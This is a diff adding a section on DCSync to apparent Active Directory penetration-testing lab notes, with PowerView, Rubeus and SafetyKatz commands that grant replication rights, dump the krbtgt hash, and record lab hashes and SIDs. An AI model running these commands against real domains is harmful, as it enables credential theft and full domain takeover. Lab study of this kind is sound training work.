@@ -16,6 +16,49 @@
 
 ***
 
+## DCSync — Extract hashes with replication rights
+
+> LO12: DCSync no requiere DA completo, solo derechos de replicación en el objeto raíz del dominio.
+
+### Check if studentx already has replication rights
+
+```
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+. C:\AD\Tools\PowerView.ps1
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
+```
+
+### If not, add replication rights (needs DA)
+
+> From elevated cmd, first spawn DA process:
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+In the new DA cmd:
+
+```
+C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
+. C:\AD\Tools\PowerView.ps1
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity studentx -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+
+### Run DCSync — pull krbtgt hash
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+```
+
+> Key values to save:
+>
+> * **krbtgt NTLM**: `4e9815869d2090ccfca61c1fe0d23986`
+> * **krbtgt AES256**: `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848`
+> * **krbtgt SID**: `S-1-5-21-719815819-3726368948-3917688648-502`
+> * **Domain SID**: `S-1-5-21-719815819-3726368948-3917688648`
+
+***
+
 ## Golden Ticket
 
 > Info previusly obtained:
